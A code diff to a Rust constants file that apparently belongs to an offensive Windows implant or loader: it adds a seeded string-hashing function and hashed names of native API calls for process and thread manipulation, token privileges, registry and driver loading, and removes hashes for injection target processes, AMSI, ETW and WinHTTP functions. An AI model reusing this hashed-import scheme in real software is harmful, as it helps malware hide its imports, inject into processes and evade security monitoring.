@@ -5,100 +5,111 @@
 pub const HASH_SEED: u32 = 0x4E67C6A7; // TODO: USE NEW NUMBERS  
 pub const HASH_XOR: u32 = 0x2B8E4F91; // TODO: USE NEW NUMBERS
 
-/* Target process hashes */
-pub const EXPLORER_EXE_HASH: u32 = 0xfa1b7ab9;
-pub const TASKHOSTW_EXE_HASH: u32 = 0x37bd682e;
-pub const RUNTIMEBROKER_EXE_HASH: u32 = 0x194fe651;
-pub const SIHOST_EXE_HASH: u32 = 0x5de77ce0;
+pub const fn hash_function(name: &[u8]) -> u32 {
+    let mut h: u32 = HASH_SEED;
+    let mut i = 0;
+    while i < name.len() {
+        let byte = name[i];
+        let c = if byte >= b'A' && byte <= b'Z' {
+            byte + 32
+        } else {
+            byte
+        };
+        h = ((h << 5).wrapping_add(h)).wrapping_add(c as u32);
+        i += 1;
+    }
+    h ^ HASH_XOR
+}
 
-/* Module hashes */
+pub const fn hash_module_wide(name: &[u16]) -> u32 {
+    let mut h: u32 = HASH_SEED;
+    let mut i = 0;
+    while i < name.len() {
+        let wide = name[i];
+        let byte = (wide & 0xFF) as u8;
+        let c = if byte >= b'A' && byte <= b'Z' {
+            byte + 32
+        } else {
+            byte
+        };
+        h = ((h << 5).wrapping_add(h)).wrapping_add(c as u32);
+        i += 1;
+    }
+    h ^ HASH_XOR
+}
+
+pub const fn hash_str(name: &str) -> u32 {
+    hash_function(name.as_bytes())
+}
+
+// Modules
 pub const NTDLL_HASH: u32 = 0x59ac125e;
 pub const KERNEL32_HASH: u32 = 0xab506c86;
-pub const WINHTTP_DLL_HASH: u32 = 0xc428144e;
-pub const ADVAPI32_DLL_HASH: u32 = 0x5c33f17a;
-pub const AMSI_DLL_HASH: u32 = 0x4acf0cea;
-pub const USER32_DLL_HASH: u32 = 0xb8013784;
 
-/* ntdll - Nt* syscalls */
+// Process
 pub const NTOPENPROCESS_HASH: u32 = 0x8088b60b;
+pub const NTTERMINATEPROCESS_HASH: u32 = 0xf74ca620;
+pub const NTQUERYINFORMATIONPROCESS_HASH: u32 = 0x859b7355;
+pub const NTCREATEPROCESSEX_HASH: u32 = 0x950ce388;
+pub const NTGETNEXTPROCESS_HASH: u32 = 0x404614d6;
+
+// Memory
 pub const NTALLOCATEVIRTUALMEMORY_HASH: u32 = 0xa86cb4bf;
 pub const NTWRITEVIRTUALMEMORY_HASH: u32 = 0x44fafd25;
+pub const NTREADVIRTUALMEMORY_HASH: u32 = 0xc5bd5654;
 pub const NTPROTECTVIRTUALMEMORY_HASH: u32 = 0xa0f9e1fb;
-pub const NTCLOSE_HASH: u32 = 0x4cf64d4e;
-pub const NTCREATETHREADEX_HASH: u32 = 0x3af328c3;
-pub const NTWAITFORSINGLEOBJECT_HASH: u32 = 0x0b31ae2f;
-pub const NTQUEUEAPCTHREAD_HASH: u32 = 0x4744b3cb;
-pub const NTRESUMETHREAD_HASH: u32 = 0x81de5923;
 
+// Thread
+pub const NTCREATETHREADEX_HASH: u32 = 0x3af328c3;
+pub const NTRESUMETHREAD_HASH: u32 = 0x81de5923;
+pub const NTQUEUEAPCTHREAD_HASH: u32 = 0x4744b3cb;
+pub const NTGETCONTEXTTHREAD_HASH: u32 = 0xd0824b77;
+pub const NTSETCONTEXTTHREAD_HASH: u32 = 0xa60784e3;
+pub const NTSETINFORMATIONTHREAD_HASH: u32 = 0x6d44c642;
+
+// Synchronization
+pub const NTWAITFORSINGLEOBJECT_HASH: u32 = 0x0b31ae2f;
+pub const NTDELAYEXECUTION_HASH: u32 = 0x738381dd;
+
+// Handle
+pub const NTCLOSE_HASH: u32 = 0x4cf64d4e;
+pub const NTDUPLICATEOBJECT_HASH: u32 = 0xd8b72bca;
+
+// File I/O
 pub const NTCREATEFILE_HASH: u32 = 0xed9c324c;
 pub const NTWRITEFILE_HASH: u32 = 0x44efece5;
 pub const NTREADFILE_HASH: u32 = 0x5ad7c4f4;
 pub const NTSETINFORMATIONFILE_HASH: u32 = 0x510cf00a;
+pub const NTDELETEFILE_HASH: u32 = 0xa20f588d;
+pub const NTQUERYDIRECTORYFILE_HASH: u32 = 0x1c7c8d05;
+pub const NTQUERYVOLUMEINFORMATIONFILE_HASH: u32 = 0xa518e4ec;
+
+// Section / Memory mapping
 pub const NTCREATESECTION_HASH: u32 = 0x23106503;
-pub const NTCREATEPROCESSEX_HASH: u32 = 0x950ce388;
-pub const NTQUERYINFORMATIONPROCESS_HASH: u32 = 0x859b7355;
-pub const NTREADVIRTUALMEMORY_HASH: u32 = 0xc5bd5654;
-pub const NTQUERYSYSTEMINFORMATION_HASH: u32 = 0xbf878c5b;
-pub const NTTERMINATEPROCESS_HASH: u32 = 0xf74ca620;
-
-pub const NTDUPLICATEOBJECT_HASH: u32 = 0xd8b72bca;
-pub const NTSETIOCOMPLETION_HASH: u32 = 0xe7bf93b6;
-pub const NTQUERYINFORMATIONWORKERFACTORY_HASH: u32 = 0x36ef45e6;
-
-pub const NTGETCONTEXTTHREAD_HASH: u32 = 0xd0824b77;
-pub const NTSETCONTEXTTHREAD_HASH: u32 = 0xa60784e3;
-
 pub const NTMAPVIEWOFSECTION_HASH: u32 = 0x4fc3e7bd;
 pub const NTUNMAPVIEWOFSECTION_HASH: u32 = 0x3c8f8c7e;
 
+// System information
+pub const NTQUERYSYSTEMINFORMATION_HASH: u32 = 0xbf878c5b;
+
+// Token
 pub const NTOPENPROCESSTOKEN_HASH: u32 = 0xe978996a;
 pub const NTQUERYINFORMATIONTOKEN_HASH: u32 = 0xb0182db7;
-pub const NTDELAYEXECUTION_HASH: u32 = 0x738381dd;
+pub const NTDUPLICATETOKEN_HASH: u32 = 0xdbf4ed54;
+pub const NTOPENTHREADTOKEN_HASH: u32 = 0x04a49c45;
+pub const NTADJUSTPRIVILEGESTOKEN_HASH: u32 = 0x9195fa3e;
 
-/* ntdll - bootstrap / Rtl functions */
-pub const LDRLOADDLL_HASH: u32 = 0x774b8c34;
-pub const RTLADDVECTOREDEXCEPTIONHANDLER_HASH: u32 = 0x2c026afa;
-pub const RTLGETVERSION_HASH: u32 = 0x46ec10ce;
-pub const RTLINITUNICODESTRING_HASH: u32 = 0xb03e293a;
-pub const RTLCREATEPROCESSPARAMETERSEX_HASH: u32 = 0x2832666c;
-pub const RTLDESTROYPROCESSPARAMETERS_HASH: u32 = 0xc9c9df67;
+// I/O Completion (thread pool)
+pub const NTSETIOCOMPLETION_HASH: u32 = 0xe7bf93b6;
+pub const NTQUERYINFORMATIONWORKERFACTORY_HASH: u32 = 0x36ef45e6;
 
-/* ntdll - CSRSS */
-pub const CSRCLIENTCONNECTTOSERVER_HASH: u32 = 0xfb860643;
-pub const CSRCLIENTCALLSERVER_HASH: u32 = 0x20b97910;
-pub const CSRNEWTHREAD_HASH: u32 = 0x0525c900;
+// Registry
+pub const NTCREATEKEY_HASH: u32 = 0xddf28cd7;
+pub const NTSETVALUEKEY_HASH: u32 = 0x12aa572a;
+pub const NTOPENKEY_HASH: u32 = 0xE25269D5;
+pub const NTQUERYVALUEKEY_HASH: u32 = 0xFDAB6FF4;
+pub const NTDELETEKEY_HASH: u32 = 0xA443FF34;
 
-/* ntdll - Tp* */
-pub const TPALLOCWORK_HASH: u32 = 0xe5df5e68;
-pub const TPPOSTWORK_HASH: u32 = 0x279ffb85;
-pub const TPRELEASEWORK_HASH: u32 = 0xaca04e5e;
-
-/* ntdll - ETW */
-pub const ETWEVENTWRITE_HASH: u32 = 0x93ecb2f5;
-pub const ETWEVENTWRITEFULL_HASH: u32 = 0x296ab186;
-pub const NTTRACEEVENT_HASH: u32 = 0xfb30d56b;
-
-/* amsi.dll */
-pub const AMSISCANBUFFER_HASH: u32 = 0x21366c81;
-
-/* kernel32 */
-pub const CREATEPROCESSW_HASH: u32 = 0x603dac20;
-pub const GETCOMPUTERNAMEEXW_HASH: u32 = 0x51d5275a;
-
-/* advapi32 */
-pub const GETUSERNAMEW_HASH: u32 = 0x7713f3ef;
-
-/* user32.dll */
-pub const ENUMDISPLAYSETTINGSW_HASH: u32 = 0xa497d4eb;
-
-/* WinHTTP */
-pub const WINHTTPOPEN_HASH: u32 = 0xc4447d36;
-pub const WINHTTPCONNECT_HASH: u32 = 0xfa6b556e;
-pub const WINHTTPOPENREQUEST_HASH: u32 = 0x15d8d3e1;
-pub const WINHTTPSENDREQUEST_HASH: u32 = 0x2eac92d9;
-pub const WINHTTPRECEIVERESPONSE_HASH: u32 = 0xc34def56;
-pub const WINHTTPREADDATA_HASH: u32 = 0xee1ab55a;
-pub const WINHTTPSETOPTION_HASH: u32 = 0x9641248b;
-pub const WINHTTPCLOSEHANDLE_HASH: u32 = 0x1e9024e6;
-pub const WINHTTPQUERYDATAAVAILABLE_HASH: u32 = 0x1626b497;
-pub const WINHTTPADDREQUESTHEADERS_HASH: u32 = 0x90867412;
+// Driver
+pub const NTLOADDRIVER_HASH: u32 = 0xB5F07844;
+pub const NTUNLOADDRIVER_HASH: u32 = 0xBA0B32C9;
